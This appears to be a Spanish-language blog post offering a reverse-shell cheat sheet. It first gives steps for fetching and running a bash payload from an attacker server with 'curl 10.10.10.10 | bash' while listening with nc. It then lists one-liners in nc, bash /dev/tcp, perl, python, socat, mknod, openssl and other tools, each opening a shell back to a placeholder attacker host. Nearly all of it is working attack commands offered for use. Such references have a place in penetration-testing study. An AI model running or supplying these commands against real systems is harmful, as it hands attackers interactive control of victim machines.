---
title: Revershell cheet sheat
description: "Revershell cheet sheat"
published: true
pubDate: "2024-06-01"
updatedDate: "2024-06-01"
heroImage: /assets/posts1/revershell/revershell.jpg
---

- Paso 1: Tener ejecucion remota de comandos,
- Paso 2: luego verificar si hay curl , lo haces con " which curl"
- Paso 3: luedo de la maquina atacante te abres un servidor http y creas un
- index.html:

  ```bash
   #!/bin/bash
   bash -i >& /dev/tcp/10.10.10.10/443 0>&1
  ```

- y te pones en escucha en la maquina atacante con:

  ```bash
   nc -nlvp 443
  ```

- y ejecutas en la maquina victima lo siguiente

  ```bash
  curl 10.10.10.10 | bash
  ```

- obtendras una revershell(realizar tratamiento de la consola):

---

**MAS FORMAS**

---

- NC

  ```bash
   nc -e /bin/sh X.X.X.X 443
  ```

- BASH

  ```bash
  bash -i >& /dev/tcp/X.X.X.X/443 0>&1
  ```

- PERL

  ```bash
  perl -e 'use Socket;$i="X.X.X.X";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  ```

- PYTHON

  ```python
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("X.X.X.X",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  ```

---

- SOCAT

  ```
   socat file:tty,raw,echo=0 tcp-connect:X.X.X.X:443
  ```

- SSH

  ```
   ssh -R 443:localhost:443 user@X.X.X.X
  ```

- TELNET

  ```
   telnet X.X.X.X 443
  ```

- mknod BASH

  ```
   mknod backpipe p && nc X.X.X.X 443 0<backpipe | /bin/bash 1>backpipe
  ```

- BASH /DEV/TCP

  ```
   /bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1
  ```

- openssl

  ```
   openssl s_client -quiet -connect X.X.X.X:443
  ```

- exec

  ```
   exec 5<>/dev/tcp/X.X.X.X/443
  ```

- xterm

  ```
   xterm -display X.X.X.X:0
  ```
